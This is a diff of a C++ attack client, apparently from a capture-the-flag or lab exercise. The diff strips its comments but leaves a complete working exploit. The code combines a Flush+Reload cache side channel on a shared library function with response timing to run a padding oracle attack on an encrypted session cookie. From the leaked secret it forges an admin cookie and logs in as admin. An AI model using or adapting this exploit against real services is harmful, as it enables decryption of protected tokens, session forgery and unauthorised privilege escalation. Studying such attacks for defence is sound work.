@@ -17,9 +17,6 @@
 #include "./base64.h"
 #include "./config.h"
 
-// ==========================================================================
-// # Helper Functions
-// ==========================================================================
 using ByteVector = std::vector<std::byte>;
 
 std::string StrFromByteVector(const ByteVector& vec) {
@@ -65,10 +62,6 @@ void RunInteractive(simple_networking::TCPClient* client) {
   }
 }
 
-// ==========================================================================
-// # Flush+Reload Side Channel
-// ==========================================================================
-
 static void* g_probe_addr = nullptr;
 static uint64_t g_threshold = 0;
 
@@ -100,9 +93,7 @@ static inline uint64_t probe(void* addr) {
   return end - start;
 }
 
-// Map the shared library file directly to ensure page sharing
 void* map_library_page() {
-  // Try to find and map libtinycrypt.so
   const char* lib_paths[] = {
     "./libtinycrypt.so.1.0.0",
     "./libtinycrypt.so.1",
@@ -124,11 +115,9 @@ void* map_library_page() {
     return nullptr;
   }
 
-  // Get file size
   struct stat st;
   fstat(fd, &st);
 
-  // Map the entire file
   void* mapped = mmap(NULL, st.st_size, PROT_READ, MAP_SHARED, fd, 0);
   close(fd);
 
@@ -139,9 +128,6 @@ void* map_library_page() {
 
   std::cout << "[+] Mapped library at: " << mapped << " (size=" << st.st_size << ")" << std::endl;
 
-  // Find the LogError function in the mapped file
-  // LogError is page-aligned (4096), so look for it at page boundaries
-  // We'll use the function pointer to calculate the offset
   void* log_error_func = reinterpret_cast<void*>(
       reinterpret_cast<uintptr_t>(&tinycrypt::LogError));
 
@@ -151,7 +137,6 @@ void* map_library_page() {
 }
 
 void init_side_channel() {
-  // Map the shared library file directly for physical page sharing
   void* mapped = map_library_page();
   if (!mapped) {
     std::cerr << "[-] Failed to map library, falling back to dynamic address" << std::endl;
@@ -160,7 +145,6 @@ void init_side_channel() {
     return;
   }
 
-  // Use dladdr to find the library base address
   Dl_info info;
   if (dladdr(reinterpret_cast<void*>(&tinycrypt::LogError), &info) == 0) {
     std::cerr << "[-] dladdr failed, falling back to dynamic address" << std::endl;
@@ -169,12 +153,10 @@ void init_side_channel() {
     return;
   }
 
-  // Calculate LogError's offset within the library file
   uintptr_t log_error_addr = reinterpret_cast<uintptr_t>(&tinycrypt::LogError);
   uintptr_t lib_base = reinterpret_cast<uintptr_t>(info.dli_fbase);
   uintptr_t offset = log_error_addr - lib_base;
 
-  // Probe the mmap'd address at the same offset (+10 like server's target_ptr)
   g_probe_addr = reinterpret_cast<void*>(
       reinterpret_cast<uintptr_t>(mapped) + offset + 10);
 
@@ -186,20 +168,17 @@ void init_side_channel() {
 void calibrate() {
   std::vector<uint64_t> hit_times, miss_times;
 
-  // Warm up
   for (int i = 0; i < 10; i++) {
     volatile char tmp = *(volatile char*)g_probe_addr;
     (void)tmp;
   }
 
-  // Measure hits
   for (int i = 0; i < 1000; i++) {
     volatile char tmp = *(volatile char*)g_probe_addr;
     (void)tmp;
     hit_times.push_back(probe(g_probe_addr));
   }
 
-  // Measure misses
   for (int i = 0; i < 1000; i++) {
     flush(g_probe_addr);
     asm volatile("mfence" ::: "memory");
@@ -218,7 +197,6 @@ void calibrate() {
             << ", threshold=" << g_threshold << std::endl;
 }
 
-// Single Flush+Reload measurement
 uint64_t flush_reload_once(simple_networking::TCPClient* client, const std::string& cookie) {
   flush(g_probe_addr);
   asm volatile("mfence" ::: "memory");
@@ -229,7 +207,6 @@ uint64_t flush_reload_once(simple_networking::TCPClient* client, const std::stri
   return probe(g_probe_addr);
 }
 
-// Measure response time (alternative side channel)
 uint64_t measure_response_time(simple_networking::TCPClient* client, const std::string& cookie) {
   uint32_t start_lo, start_hi, end_lo, end_hi;
 
@@ -245,7 +222,6 @@ uint64_t measure_response_time(simple_networking::TCPClient* client, const std::
   return end - start;
 }
 
-// Get median response time
 uint64_t median_response_time(simple_networking::TCPClient* client, const std::string& cookie, int samples) {
   std::vector<uint64_t> times;
   for (int i = 0; i < samples; i++) {
@@ -255,7 +231,6 @@ uint64_t median_response_time(simple_networking::TCPClient* client, const std::s
   return times[samples / 2];
 }
 
-// Measure with many samples, return median probe time
 uint64_t measure_median_probe(simple_networking::TCPClient* client, const std::string& cookie, int samples) {
   std::vector<uint64_t> times;
 
@@ -267,7 +242,6 @@ uint64_t measure_median_probe(simple_networking::TCPClient* client, const std::s
   return times[times.size() / 2];
 }
 
-// Count cache hits (probe time < threshold)
 int count_hits(simple_networking::TCPClient* client, const std::string& cookie, int samples, uint64_t threshold) {
   int hits = 0;
 
@@ -279,7 +253,6 @@ int count_hits(simple_networking::TCPClient* client, const std::string& cookie, 
   return hits;
 }
 
-// Measure probe times and return statistics
 void measure_stats(simple_networking::TCPClient* client, const std::string& cookie, int samples,
                    uint64_t& min_time, uint64_t& median_time, uint64_t& max_time) {
   std::vector<uint64_t> times;
@@ -294,22 +267,16 @@ void measure_stats(simple_networking::TCPClient* client, const std::string& cook
   max_time = times[samples - 1];
 }
 
-// ==========================================================================
-// # Padding Oracle Attack
-// ==========================================================================
-
 void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
   std::cout << "Running stored commands..." << std::endl;
 
   init_side_channel();
   calibrate();
 
-  // Get cookie
   client->SendMessage("get-cookie");
   std::string cookie = client->ReadMessage().ToString();
   std::cout << "[+] Got cookie: " << cookie << std::endl;
 
-  // Parse cookie
   size_t dot_pos = cookie.find('.');
   if (dot_pos == std::string::npos) {
     std::cerr << "[-] Invalid cookie format" << std::endl;
@@ -322,12 +289,10 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
 
   std::cout << "[+] Ciphertext: " << iv_ct.size() << " bytes" << std::endl;
 
-  // Corrupted cookie for testing
   ByteVector corrupted = iv_ct;
   corrupted[20] = static_cast<std::byte>(static_cast<uint8_t>(corrupted[20]) ^ 0xFF);
   std::string corrupted_cookie = base64::base64_encode(corrupted) + "." + hmac_b64;
 
-  // Test side channel
   std::cout << "[+] Testing cache side channel..." << std::endl;
 
   uint64_t valid_min, valid_med, valid_max;
@@ -339,21 +304,18 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
   std::cout << "    Cache Valid:   min=" << valid_min << " med=" << valid_med << " max=" << valid_max << std::endl;
   std::cout << "    Cache Invalid: min=" << invalid_min << " med=" << invalid_med << " max=" << invalid_max << std::endl;
 
-  // Test response timing side channel
   std::cout << "[+] Testing response timing..." << std::endl;
   uint64_t valid_time = median_response_time(client, cookie, 50);
   uint64_t invalid_time = median_response_time(client, corrupted_cookie, 50);
   std::cout << "    Response Valid:   " << valid_time << " cycles" << std::endl;
   std::cout << "    Response Invalid: " << invalid_time << " cycles" << std::endl;
 
-  // Decide which side channel to use
   int64_t cache_diff = (int64_t)invalid_med - (int64_t)valid_med;
   int64_t timing_diff = (int64_t)invalid_time - (int64_t)valid_time;
 
   std::cout << "    Cache diff: " << cache_diff << ", Timing diff: " << timing_diff << std::endl;
 
-  // Use timing if it shows better signal (invalid should take longer due to LogError)
-  bool use_timing = (timing_diff > 5000);  // Invalid takes >5000 cycles longer
+  bool use_timing = (timing_diff > 5000);
 
   uint64_t dynamic_threshold = (valid_med + invalid_med) / 2;
 
@@ -361,7 +323,6 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
   int invalid_hits = count_hits(client, corrupted_cookie, 30, dynamic_threshold);
   std::cout << "    Cache Hits (threshold=" << dynamic_threshold << "): valid=" << valid_hits << " invalid=" << invalid_hits << std::endl;
 
-  // Determine method
   bool valid_higher = (valid_hits > invalid_hits + 3);
   bool invalid_higher = (invalid_hits > valid_hits + 3);
 
@@ -377,13 +338,11 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
     use_timing = true;
   }
 
-  // Plaintext: "nobody-XXXXXXXX" + 0x01 padding = 16 bytes
   std::vector<uint8_t> intermediate(16, 0);
   std::vector<uint8_t> recovered(16, 0);
 
-  const int SAMPLES = use_timing ? 15 : 31;  // Fewer samples needed for timing
+  const int SAMPLES = use_timing ? 15 : 31;
 
-  // Padding oracle attack
   for (int pos = 15; pos >= 0; pos--) {
     uint8_t target_pad = 16 - pos;
 
@@ -391,7 +350,6 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
 
     ByteVector modified = iv_ct;
 
-    // Set already-known bytes for target padding
     for (int j = pos + 1; j < 16; j++) {
       modified[j] = static_cast<std::byte>(intermediate[j] ^ target_pad);
     }
@@ -405,19 +363,14 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
       std::string test_cookie = base64::base64_encode(modified) + "." + hmac_b64;
 
       if (use_timing) {
-        // Timing attack: valid padding = faster response (no LogError)
         uint64_t time = median_response_time(client, test_cookie, SAMPLES);
         if (time < best_time) {
           best_time = time;
           best_guess = guess;
         }
       } else {
-        // Cache attack
         int hits = count_hits(client, test_cookie, SAMPLES, dynamic_threshold);
 
-        // Valid padding = LogError NOT called
-        // If invalid_higher: valid padding has FEWER hits (look for minimum)
-        // If valid_higher (inverted): valid padding has MORE hits (look for maximum)
         if (invalid_higher) {
           if (hits < best_hits) {
             best_hits = hits;
@@ -448,7 +401,6 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
     std::cout << std::endl;
   }
 
-  // Extract results
   std::string plaintext(recovered.begin(), recovered.end());
   std::cout << "[+] Recovered: ";
   for (int i = 0; i < 16; i++) {
@@ -460,7 +412,6 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
   std::string leaked_cookie_secret = plaintext.substr(7, 8);
   PrintLeakedCookieSecret(leaked_cookie_secret);
 
-  // Forge admin cookie
   std::string admin_plain = "admin-" + leaked_cookie_secret;
   std::string admin_b64 = base64::base64_encode(ByteVectorFromStr(admin_plain));
 
@@ -468,7 +419,6 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
   client->SendMessage("encrypt " + admin_b64);
   std::string admin_cookie = client->ReadMessage().ToString();
 
-  // Login
   client->SendMessage("login " + admin_cookie);
   PrintResponse(client);
 }
